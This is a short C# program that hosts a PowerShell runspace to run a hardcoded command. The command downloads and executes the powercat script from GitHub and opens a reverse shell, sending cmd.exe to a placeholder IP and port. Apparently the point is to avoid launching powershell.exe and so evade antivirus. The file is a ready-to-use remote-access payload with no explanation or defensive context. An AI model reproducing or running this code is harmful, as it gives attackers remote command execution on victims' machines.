using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace AV
{
    internal class Runspace01
    {
       
        private static void Main(string[] args)
        {
            
            string cmd = " IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c IP -p PORT -e cmd.exe";

            RunspaceConfiguration runspaceconfig = RunspaceConfiguration.Create();
            Runspace runspace = RunspaceFactory.CreateRunspace(runspaceconfig);
            runspace.Open();

            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(cmd);
            pipeline.Invoke();
        }
    }
}
